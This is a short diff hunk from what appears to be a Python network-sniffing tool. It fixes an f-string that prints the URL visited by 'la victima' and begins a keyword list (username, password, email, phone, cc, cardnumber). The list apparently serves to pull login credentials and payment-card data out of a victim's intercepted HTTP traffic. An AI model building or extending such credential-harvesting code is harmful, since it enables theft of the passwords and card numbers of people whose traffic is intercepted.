@@ -49,7 +49,7 @@ def request(packet):
     domain = parsed_url.netloc
     path = parsed_url.path
 
-    show_message("URL visitada port la victima", "", "{scheme}://{domain}{path}")
+    show_message("URL visitada port la victima", "", f"{scheme}://{domain}{path}")
 
     keywords = [
         "user", "username", "login", "email", "mail", "phone", "pass", "password", "cc", "cardnumber", "card_num", 
